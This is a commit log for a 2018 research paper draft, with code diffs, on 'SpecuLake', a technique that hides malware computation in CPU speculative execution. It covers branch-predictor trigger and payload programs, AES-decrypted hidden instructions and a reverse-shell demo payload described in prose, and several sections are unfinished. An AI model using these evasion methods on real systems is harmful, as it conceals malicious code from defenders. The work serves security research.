-\medskip
-
-In this paper, we explore another attack enabled by speculative execution:
-\speculake, which \emph{hides computation} within
-the ``speculative world''. Taking advantage of the CPU's speculation to secretly
-perform computation,
-we can produce binaries that thwart existing reverse engineering
-techniques. Because the speculative parts of a program never ``truly'' execute,
-we can hide program functionality in the unreachable dead code in a program.
-Even a full instruction trace, captured by a hardware debugger or software
-emulator, will be unable to capture the logic performed speculatively.
-This technique could lead to sophisticated malware that hides its behavior
-from both static and dynamic analysis.
-
-Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of reported malware. 
-For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
-data that must be ``unpacked'' at runtime, making it difficult to tell
-statically what a program will do~\cite{malware-packers}. Malware may also use
-\emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
-
-However, with some effort, these existing techniques can be defeated. Analysts can use
-dynamic execution to unpack malware and reveal its
-behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
-coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
-
-\speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
-
-At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
-
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
-
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
-
-Simulating or modelling the speculative execution path is a difficult task for a
-program analyst hoping to reverse engineer an \speculake binary. First, the
-analyst must reverse engineer and accurately model the closed-source proprietary
-components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
-author only has to use a partial model of these components and produce binaries
-that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
-
-% Results summary
-In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
-
-Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
-
-% contributions?
-% - explore the limits of speculative execution
-% - propose novel concept of hiding computation in speculative execution
-% - implement example applications using this concept, including decrypting
-%   data speculatively
-% - demonstrate using benign program (openssl) as trigger
-% - identify defenses and discuss ways to counter them
-
-% TODO: we don't talk at all about how an analyst might try to enumerate
-% the potential entry points to the speculative world, and how that can be
-% made difficult
-
-%%%%%%%%%%%%%%
-\section{Background}
-Modern CPU designs employ a wide range of tricks in order to maximize
-performance. In this section, we provide preliminary background as they are
-relevant to our system, as well as a brief summary of the Spectre vulnerability.
-
-\subsection{Out-of-Order Execution}
-Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
-order}, with the CPU allowing future instructions to be worked on and executed
-while it waits for slower or stalled instructions to complete. To maintain
-correctness and the original (Von Neumann) ordering, instructions are tracked in
-a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
-worked on out of order. Instructions are \emph{retired} from the ROB when
-they are completed and there are no previous instructions that have yet to
-retire. Upon retiring, an instruction's results are committed to the architectural
-state of the CPU. Thus, the ROB ensures that the program (or debugger) view
-of the CPU state always updates in program execution order, despite out of order
-execution.
-
-\subsection{Speculative Execution}
-
-CPUs also attempt to keep their pipeline full by predicting the path of
-execution. For example, a program may contain a branch that depends on a result
-from a prior slow instruction. Rather than wait for the result, the CPU can
-\emph{speculatively execute} instructions down one of the paths of a branch,
-storing the results of the speculative instructions in the ROB.
-If the guess of the branch target turns out to be correct, the CPU can quickly
-retire all the instructions it has speculatively executed while waiting. If the
-guess is incorrect, the CPU must discard the
-(incorrectly) speculated instructions from the ROB, and continue executing from the
-correct branch target.
-
-\subsection{Branch Prediction}
-When a CPU mispredicts a branch, the speculative execution results are
-discarded, costing the CPU several cycles as the pipeline is flushed. To
-minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. Branch predictors maintain a short history of previous
-branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken), and use
-this to inform the CPU's guess for speculative execution.
-
-There are two kinds of branches a CPU handles: \emph{direct} and
-\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
-continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
-branch, the CPU may not know if the branch is taken or not until preceding
-instructions retire. An \emph{indirect} branch is always taken, but its address
-is determined by the value of a register or memory address. Direct branches are
-typically used for control flow such as \texttt{if} or
-\texttt{for}/\texttt{while} statements, while indirect branches are used for
-function pointers, class methods, or case statements.
-
-%- BHB, BTB
-
-\subsection{Spectre}
-
-In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
-
-Consider the following code snippet from the Spectre
-paper~\cite{spectre}:
-
-\begin{lstlisting}
-    if (x < array1_size)
-        y = array2[array1[x] * 256];
-\end{lstlisting}
-
-The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
-But if the branch predictor makes an incorrect guess on the branch's direction
-and speculatively executes inside the \texttt{if} statement, it may
-cause a read beyond the boundary of \texttt{array1}. The result of this will
-then (speculatively) be multiplied by 256 and used as an index into
-\texttt{array2}. Although the CPU will not commit
-the speculative update to \texttt{y}, it will still issue a memory read to
-\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
-the CPU realizes the branch misprediction, it does not rollback the
-state of the cache, as this does not directly influence program correctness.
-However, the set of cached values is observable to the program via a
-side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
-reveal the speculative value of \texttt{array1[x]*256}, for any value of
-\texttt{x}. An attacker that is able to perform such a side-channel inference on
-the cache can learn the speculative result of an out-of-bounds read from
-\texttt{array1}.
-
-Spectre can also be applied to indirect branches. Branch predictors use the
-history of previous branches to predict the destination of an indirect jump when
-the destination is not yet known. For direct branches, only one of two
-destinations (taken or not taken) are possible to speculatively execute. But for
-indirect branches, a mistrained branch predictor can potentially be coerced into
-speculatively executing from \emph{any} target instruction in the binary.
-
-TODO more on why this is crucial...
-
-%%%%%%%%%%%%%%
-\section{Architecture}
-
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
-
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
-
-\subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB
-
-\subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
-
-%%%%%%%%%%%%%%
-\section{Application Payloads}
-
-Given the speculative primitive, what can we do with it?
-
-Finite state machine...
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
-
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
-
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
 \section{Discussion}
@@
 %%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
-\section{Conclusion}
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{paper}
-
-\end{document}

### 2018-04-27 paper/implementation.tex

\section{Implementation and Evaluation}

\subsection{Turing Machine}

% Target_fn returning next step given access to current state in global vars
%   - busy beaver
%   - cache page speculation on repetetive cycles. 
%       - mis-predict w/in speculative world

% speed (complete smaller busy beaver?)
% against reference python implementation?

\subsection{AES Decryption}

% implementation 
%   Key Schedule expansion / obfuscation
%
% you can speculatively execute AES instructions

\subsection{Virtual Machine}

\subsubsection{SPASM}
\label{subsubsec:spasm}
Constructing an emulator making use of the speculative primitive requires  
a trade off in expresive capability versus speed. 
We have implemented SPASM as a model using two pseudo-registers, and six 
bit instruction length which allows for a relatively direct programming model 
in which structured values can be entered into memory locations before making 
a systemcall.

To acheive a balance with speed the number of bits in each instruction is both 
fixed and minimized.  A variable length instruction would require that the prime
and probe stage search the maximum number of bits on each round, and each 
aditional bit doubles the search space that the prime and probe stage must 
traverse.  So every bit shorted effectively doubles the throughput of the 
emulator, and there is effectively no advantage to allowing variable length 
instructions.

Using this model we have implemented multiple example programs that can be run
as encrypted payloads in an \speculake payload. A \textit{HelloWorld} program 
that prints to stdout. A \textit{FizzBuzz} program that demonstrates control 
flow and arithmetic operations while printing to stdout. And finally,
a \textit{ReverseShell} program that opens and connects to a socket before  
duplicating I/O and executing a local shell.

Expected performance for a given SPASM binary will vary given multiple factors, 
the most important of which is the prime and probe redundancy. This can be tuned
based on the specific trigger, as it is used to establish confidence that a signal 
has been identified in the indicess returned from the "speculative world". 
Thus accomplishing a task using SPASM generally equates to:

\begin{lstlisting}
    Redundancy * Probe_Space * Num_Instr
\end{lstlisting}

For example, the \textit{ReverseShell} program makes six system calls to open a socket,
connect to it, duplicate I/O, and execve a specified program. This requires 355
SPASM instructions to complete. The probe space for the 6-bit SPASM ISA requires 
a traversal of an array od size 64. When using a redundancy of 256 to establish
confidence in the signal the entire \textit{ReverseShell} program takes under 7 
seconds to run once triggered.

\begin{figure}[b]
    \centering
        \includegraphics[width=0.5\textwidth]{figures/spasm_model}
    \caption{This model describes the VM control flow. An encrypted SPASM binary 
        stored in dead code or data accessible to \textit{Speculative Computation} 
        is decrypted  and then returned through the primitive. The SPASM 
        \textit{Resultant Computation} performs the SPASM emulation to update the 
        process state before the next instruction is decrypted.}
    \label{fig:spasm_model}
\end{figure}

\subsubsection{ARM}
\label{subsubsec:arm}
While the custom emulator that we developed gives a much higher level abstraction to 
a developer, it still requires programs to be written in custom assembly 
language. To demonstrate that the extensibility of this model we also implemeted a wrapper
around an ARM emulator, such that programs can be written in a high level languages 
such as C or C++, statically compiled to binaries for the ARM emulator, and deployed 
as an encrypted data sections to be decrypted at run-time.

% ARM Wrapper
%   - memory
%   - single instruction vs block

We chose to implement a wrapper around ARM as it has a 32-bit fixed instruction
length. However this causes a significant hit to the speed at which operations 
can be performed as the probe space is increased by a factor of four in 
comparison with SPASM,  and we must complete 4 of these transactions to 
retreive a single ARM opcode. Trading more expressive operations for speed
results in a 16x slowdown when considering per-instruction throughput.

\begin{lstlisting}
    4 * Redundancy * Probe_Space * Num_Instr
\end{lstlisting}

\subsection{OpenSSL Trigger}

% extract jump patterns
% sufficiency checks 
%
% trigger strength
%   - future work developing tools to determine sufficiency and strength
%
% OPENSSL TRIGGERING REVERSE SHELL SPASM PAYLOAD

%%%%%%%%%%%%%%

### 2018-04-27 paper/payloads.tex

\section{Application Payloads}

While the amount of computation done in a single speculative execution is small,
we demonstrate several applications that can take advantage of multiple
speculative runs to carry out computation.

As a first step, we observe that this primitive can be used to trivially
implement a finite state machine: any logic can be done in the speculative
world, while
updates to the state are communicated to the real world where they are stored.
On the next run of the speculative instructions, they read from the real world
state (and other inputs), compute any state transitions, and communicate the
result. In this mode, the state is maintained by the real world, while updates
are controlled by code executed speculatively.

\begin{figure}[t]
    \centering
        \includegraphics[width=0.4\textwidth]{figures/general_model}
    \caption{ General model of speculative computation within the Measure 
        process when triggered. \textit{Speculative Computation} has access
        to all variables which do not require a memory transaction within
        the current state of the process. The process can subsequently make
        \textit{Resultant Computations} based on the value returned from 
        Prime and Probe to update the state of the process. }
    \label{fig:general_model}
\end{figure}

\subsection{Turing Machine}
\label{subsec:turing}
- Arbitrary computation

\subsection{Unpacking and Decryption}
\label{subsec:decryption}
- AES instructions

% 
% Argument for obfuscating keyschedule
% 
% Challenge for Rev-Engineer
%   - Find the obfuscated key schedule
%   - Find the correct trigger program

\subsection{Virtual Machines}
Given the specific constraints that the speculative environment enforces on these 
paylods, general purpose compuatation []. We demonstrated in section~\ref{subsec:turing} that 
general purpose computation is possible using computation performed in the 
speculative environment. However, a turing machine is not a user friendly model,
nor is it an efficient model for computation when attempting to accomplish tasks
on modern processors.

Using emulators in the "real world" allows for crafted binary programs to be 
instrumented in dead code and, as demonstrated in secton~\ref{subsec:decryption} 
encrypted and hidden. This gives an advantage to attackers as traditional 
reverse engineering methods will reveal only that emulation is being done. 
It reveals nothing about the ultimate goal of the program.

To accomodate both developers as well as the unique constraints 
enforced by the speculative primitive, a custom emulation solution is required. We 
have approached this challenge from both directions. First we demonstrate 
general purpose emulation using a custom instruction set -- SPASM -- which
accomodates the speculative primitive specifically. Next we investigate custom 
wrappers on traditional emulators allow for similar payload construction,
with a much more developer friendly

% REFERENCE FIGURES
% - Constraints enforced by speculative primitive
%       - more bits = slower
%       - less bits = less expressive
%       - must be computable within speculative ROB limit (~150 instrs) (decrypt only)
%   
% - optimizations for weird-machine computations

% --- VM
%   - Wrappers around traditional ISA VMs
%   - SPASM  custom emulator made f
%%%%%%%%%%%%%%

### 2018-04-27 openssl/payload.c
works on laptop

@@ -59,7 +59,7 @@ typedef struct jump_st {
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
-#define NUM_JUMPS 16
+#define NUM_JUMPS 32
 
 
 inline void call(void *fn_ptr) __attribute__((always_inline));
@@ -188,6 +188,24 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff780d407, 0x7ffff789730b}, //  retq   
         {0x7ffff7897318, 0x7ffff788a420}, //  retq  
         //*/
+
+        {0x7ffff77d304c, 0x7ffff77dc0d4}, // :   retq   
+        {0x7ffff77d314c, 0x7ffff77dc1d4}, // :   retq   
+        {0x7ffff77d324c, 0x7ffff77dc2d4}, // :   retq   
+        {0x7ffff77d334c, 0x7ffff77dc3d4}, // :   retq   
+        {0x7ffff77d344c, 0x7ffff77dc4d4}, // :   retq   
+        {0x7ffff77d354c, 0x7ffff77dc5d4}, // :   retq   
+        {0x7ffff77d364c, 0x7ffff77dc6d4}, // :   retq   
+        {0x7ffff77d374c, 0x7ffff77dc7d4}, // :   retq   
+        {0x7ffff77d384c, 0x7ffff77dc8d4}, // :   retq   
+        {0x7ffff77d394c, 0x7ffff77dc9d4}, // :   retq   
+        {0x7ffff77d3a4c, 0x7ffff77dcad4}, // :   retq   
+        {0x7ffff77d3b4c, 0x7ffff77dcbd4}, // :   retq   
+        {0x7ffff77d3c4c, 0x7ffff77dccd4}, // :   retq   
+        {0x7ffff77d3d4c, 0x7ffff77dcdd4}, // :   retq   
+        {0x7ffff77d3e4c, 0x7ffff77dced4}, // :   retq   
+        {0x7ffff77d3f4c, 0x7ffff77dcfd4}, // :   retq   
+
         {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   
         {0x7ffff77e7bf9, 0x7ffff77e9421}, // :   retq   
         {0x7ffff77ee8a0, 0x7ffff77e836f}, // :   retq   
@@ -455,6 +473,7 @@ int main()
         //0xff, 0xd0,         //  callq *%rax
[…]

### 2018-04-27 openssl/trigger.c

@@ -15,7 +15,7 @@ typedef struct jump_st {
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
-#define NUM_JUMPS 16
+#define NUM_JUMPS 32
 
 
 
@@ -59,6 +59,24 @@ void load_page(uint64_t addr)
 }
 
 jump addrs[NUM_JUMPS] = {
+        {0x7ffff77d304c, 0x7ffff77dc0d4}, // :   retq   
+        {0x7ffff77d314c, 0x7ffff77dc1d4}, // :   retq   
+        {0x7ffff77d324c, 0x7ffff77dc2d4}, // :   retq   
+        {0x7ffff77d334c, 0x7ffff77dc3d4}, // :   retq   
+        {0x7ffff77d344c, 0x7ffff77dc4d4}, // :   retq   
+        {0x7ffff77d354c, 0x7ffff77dc5d4}, // :   retq   
+        {0x7ffff77d364c, 0x7ffff77dc6d4}, // :   retq   
+        {0x7ffff77d374c, 0x7ffff77dc7d4}, // :   retq   
+        {0x7ffff77d384c, 0x7ffff77dc8d4}, // :   retq   
+        {0x7ffff77d394c, 0x7ffff77dc9d4}, // :   retq   
+        {0x7ffff77d3a4c, 0x7ffff77dcad4}, // :   retq   
+        {0x7ffff77d3b4c, 0x7ffff77dcbd4}, // :   retq   
+        {0x7ffff77d3c4c, 0x7ffff77dccd4}, // :   retq   
+        {0x7ffff77d3d4c, 0x7ffff77dcdd4}, // :   retq   
+        {0x7ffff77d3e4c, 0x7ffff77dced4}, // :   retq   
+        {0x7ffff77d3f4c, 0x7ffff77dcfd4}, // :   retq   
+
+
         {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   
         {0x7ffff77e7bf9, 0x7ffff77e9421}, // :   retq   
         {0x7ffff77ee8a0, 0x7ffff77e836f}, // :   retq   
@@ -84,6 +102,13 @@ void setup()
 {
     memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
 
+    uint8_t callq_rax[] = {
+        0x48, 0x03, 0x03,   // add (%rbx),%rax
+        //0xff, 0xd0,         //  callq *%rax
[…]

### 2018-04-27 openssl/payload.c
only need 16 jumps...

@@ -59,7 +59,7 @@ typedef struct jump_st {
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
-#define NUM_JUMPS 32
+#define NUM_JUMPS 16
 
 
 inline void call(void *fn_ptr) __attribute__((always_inline));
@@ -189,6 +189,7 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff7897318, 0x7ffff788a420}, //  retq  
         //*/
 
+    /*
         {0x7ffff77d304c, 0x7ffff77dc0d4}, // :   retq   
         {0x7ffff77d314c, 0x7ffff77dc1d4}, // :   retq   
         {0x7ffff77d324c, 0x7ffff77dc2d4}, // :   retq   
@@ -205,6 +206,7 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff77d3d4c, 0x7ffff77dcdd4}, // :   retq   
         {0x7ffff77d3e4c, 0x7ffff77dced4}, // :   retq   
         {0x7ffff77d3f4c, 0x7ffff77dcfd4}, // :   retq   
+    // */
 
         {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   
         {0x7ffff77e7bf9, 0x7ffff77e9421}, // :   retq   

### 2018-04-27 openssl/trigger.c

@@ -15,7 +15,7 @@ typedef struct jump_st {
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
-#define NUM_JUMPS 32
+#define NUM_JUMPS 16
 
 
 
@@ -59,6 +59,7 @@ void load_page(uint64_t addr)
 }
 
 jump addrs[NUM_JUMPS] = {
+    /*
         {0x7ffff77d304c, 0x7ffff77dc0d4}, // :   retq   
         {0x7ffff77d314c, 0x7ffff77dc1d4}, // :   retq   
         {0x7ffff77d324c, 0x7ffff77dc2d4}, // :   retq   
@@ -75,6 +76,7 @@ jump addrs[NUM_JUMPS] = {
         {0x7ffff77d3d4c, 0x7ffff77dcdd4}, // :   retq   
         {0x7ffff77d3e4c, 0x7ffff77dced4}, // :   retq   
         {0x7ffff77d3f4c, 0x7ffff77dcfd4}, // :   retq   
+    */
 
 
         {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   

### 2018-04-27 openssl/trigger.c
use a ret instead of a jmpq, still works on zb

@@ -105,9 +105,10 @@ void setup()
     memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
 
     uint8_t callq_rax[] = {
-        0x48, 0x03, 0x03,   // add (%rbx),%rax
-        //0xff, 0xd0,         //  callq *%rax
-         0xff, 0xe0,  // jmpq *%rax
+         //0x48, 0x03, 0x03,    // add (%rbx),%rax
+         //0xff, 0xe0,          // jmpq *%rax
+        0x90, 0x90, 0x90,       // nop, nop, nop
+        0x90, 0xc3,             // nop, ret
     };
     int callq_offset = 2;
 
@@ -212,6 +213,7 @@ int main()
         fn_ptr2 = (void (*)(void))addrs[NUM_JUMPS-1].to;
         //(*fn_ptr)();
         //printf("calling...\n");
+        asm volatile ("push %%rax\n" :: "a"(fn_ptr2));
         asm volatile ("jmpq *%%rcx\n" :: "c"(fn_ptr), "a"(fn_ptr2), "b"(&jmp_ptr) :);
         //call(fn_ptr);
 done_jumps:

### 2018-04-29 paper/architecture.tex
Added pass on limitations of speculative exec. Added zbuff data

@@
 
+\begin{figure}[t]
+    \centering
+        \includegraphics[width=0.5\textwidth]{figures/Speculative_capacity.png}
+    \caption{}
+    \label{fig:spec-capacity}
+\end{figure}
+
 \subsection{Limits of Speculative Execution}
 We performed several experiments to investigate how much computation can be done
-speculatively. We performed these experiments on an Intel~(TODO: Jack fill in).
-TODO: Jack describe experiment and results:
+speculatively. We performed these experiments on an Intel Xeon-1270, as well as 
+an intel i5-7200U to verify the results across processor generations.
 
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB (cite other work that supports this)
+Speculative branching is not a new feature in processors~\cite{branching-hist}, 
+and it has been integrated in multiple generations of commodity processors today. 
+Accordingly speculative instruction capacity has fairly well defined limits, in 
+line with known features of processor designs. We have determined that features 
+like reorder buffers (ROB), physical register file (PRF), and cache miss timing
+determines a strong limit on the number of instructions that can be accomplished
+speculatively.
+
+\subsubsection{Reorder Buffer Capacity} \label{sssec:ROB}
+To determine these limits we first measured the capacity of the reorder buffer
+using the method outlined by~\cite{intel-rob-capacity}. By performing two cache loads
+with a variable number or instructions between them and watching the amount of 
+time taked to complete this loop we can find a definitive number of instructions
+at which the second cache access is outside of the ROB. Figure~\ref{fig:spec-capacity}
+shows this step function at ~220 instructions for both Sandy Lake and Kaby Lake 
+generation processors.
+
+\subsubsection{Cache Miss Duration}
+When executing instructions speculatively we rely on a load from a cache line that
+has recently been evicted. We have examined the number of cycles a
+cache miss takes to return by artificially evicting an item from cache and timing 
+a request for that specific item. The distribution of cycle counts can be seen in
+Figure~\ref{fig:cache-miss}, along with the CDF. For a large majority of cases, 
+an item evicted from cache will have 300 clock cycles and often much more.
+
+\subsubsection{Speculative Instruction Capacity}
+To verify that the ROB defines an upper limit for speculative instruction capacity
+we instrumented the trigger and payload to test variable length target functions. 
+In addition we tested whether instruction complexity or data dependencies impact
+the maximum work that can be completed. We found that the processor can identify 
+some operations that have no effect on output registers and allows them to use the 
+entire size provided by the ROB, as determined in section~\ref{sssec:ROB}. This includes 
+idomatic no-ops, which have no effect on the registers, for example the instruction 
+"xchg \%rax \%rax" or similarly "xor \%rax, \%rax". However, if an instruction
+has the potential to cause data dependencies, it must use an entry in the PRF
+until it reaches the correct stage in the execution pipeline. In this case, the number 
+of instructions is limited by the PRF entries available
+
+Most notably instructions making use of the extended x86 registers are still
+valid within speculative context. Specifically Intel's hardware accelerated AES-NI
+encryption and decryption instructions, which make use of the 128 bit registers.
+As shown in Figure~\ref{fig:spec-capacity}, speculative environments can complete
+a significant number of AES rounds -- more than enough to decrypt a full block 
+using AES-CBC. We investigate the use of AES instructions in the spculative environment
+further in Sections~\ref{subsec:decryption}.
+
+\medskip
+
+When executing speculatively, the number of instrutions completed 
+will almost never be limited by cache miss duration. Instead
+ROB size and processor mechanisms for resolving 
+data dependencies define an upper boundary.
+
+% TODO: 
+% - Highlist instruction signal variablity (add v mul v aesdec v nop)?
+% - Limitation is in the ROB (cite other work that supports this)
+% - MORE PROCESSORS for testing?
+% - ARM?
 

### 2018-04-30 paper/payloads.tex
add aes description

@@
 \label{subsec:decryption}
-- AES instructions
+While Section \ref{subsec:turing} demonstrates that arbitary computation is
+possible, if a reverse engineer can discover the \emph{speculative instructions}
+they can determine the execution of this program by simply reading the
+instructions that are passed along. To avoid this we can encrypt the
+\emph{speculative instructions}, meaning that a reverse engineer can never
+determine these instructions by examining the ELF file, or generating source
+code.
+
+The encrypted code must be decrypted so that the instructions can be executed.
+In order to obscure this information from the ``real world'' the speculative
+world must do the decryption. As such we have built a prototype capable of
+decrypting messages in the speculative world and passing the results back to the
+real world in pieces.
+
+The speculative world is able to take advantage of the AES-NI instructions to
+decrypt messages. In order to avoid detection (as well as reduce the computation
+that needs to be done in the speculative world) the key expansion can be done
+ahead of time. However, the key schedule does have a structure that could be
+detected by a reverse engineer. Thus 11 random round keys are selected. This
+obfuscated key schedule makes it more difficult for a reverse engineer to
+determine that there is encrypted content. Additionally since the content is
+only accessed when the correct trigger program is running the challenges facing
+a reverse engineer are great.
 
@@
 \subsection{Virtual Machines}
-Given the specific constraints that the speculative environment enforces on these 
-paylods, general purpose compuatation []. We demonstrated in section~\ref{subsec:turing} that 
-general purpose computation is possible using computation performed in the 
-speculative environment. However, a turing machine is not a user friendly model,
-nor is it an efficient model for computation when attempting to accomplish tasks
-on modern processors.
+Given the specific constraints that the speculative environment enforces on
+these paylods, general purpose compuatation []. We demonstrated in
+section~\ref{subsec:turing} that general purpose computation is possible using
+computation performed in the speculative environment. However, a turing machine
+is not a user friendly model, nor is it an efficient model for computation when
+attempting to accomplish tasks on modern processors.
 

### 2018-04-30 emulator/server.h
update emulator

@@ -1,7 +1,7 @@
 #ifndef SERVER_H 
 #define SERVER_H
 #include <unicorn/unicorn.h>
-#define BUFFSIZE 5
+#define BUFFSIZE 9
 #define CODESIZE 3
 
 void initializeUnicorn(uc_engine *);

### 2018-05-01 paper/related-work.tex
Starting Related work

\section{Related Work}
\label{sec:related-work}

This work makes use of ideas spanning multiple computer science and computer
security disciplines.

\subsection{CPU Reverse Engineering}
Leading up to the discovery and release of the Spectre and Meltdown vulnerabilities
multiple teams were working to reverse engineer the mechanisms that implemented in 
the microcode of various processors.

\subsection{Weird Machines}

\subsection{Red Pills}

\subsection{Cache Side Channels}

%%%%%%%%%%%%%%

### 2018-05-01 paper/payloads.tex
update encryption model

--- 2018-04-27 paper/payloads.tex
@@
 implement a finite state machine: any logic can be done in the speculative
-world, while
-updates to the state are communicated to the real world where they are stored.
-On the next run of the speculative instructions, they read from the real world
-state (and other inputs), compute any state transitions, and communicate the
-result. In this mode, the state is maintained by the real world, while updates
-are controlled by code executed speculatively.
+world, while updates to the state are communicated to the real world where they
+are stored. On the next run of the speculative instructions, they read from the
+real world state (and other inputs), compute any state transitions, and
+communicate the result. In this mode, the state is maintained by the real world,
+while updates are controlled by code executed speculatively.
+
+Next, we observe that the instructions to be executed speculatively can be
+obscured further by encrypting them. This encryption allows for hidden
+computation, instructions are stored in the real world encrypted, they are then
+decrypted in the speculative world and passed to the real world to be executed.
+This method makes it appear as though the program is generating its own code.
 
@@
 \label{subsec:turing}
-- Arbitrary computation
+To demonstrate that arbitrary computation can be done in the speculative world
+we create a Turing Machine to compute a 6 state Busy Beaver Turing Machine.
 
@@
 \label{subsec:decryption}
-- AES instructions
+While Section \ref{subsec:turing} demonstrates that arbitrary computation is
+possible, if a reverse engineer can discover the \emph{speculative instructions}
+they can determine the execution of the program by simply reading the
+instructions that are to be executed speculatively. To avoid this these
+instructions can be encrypted, meaning that a reverse engineer can never
+determine these instructions by examining the ELF file, or generating source
+code.
+
+In order for these instructions to be executed they must be decrypted. We wish
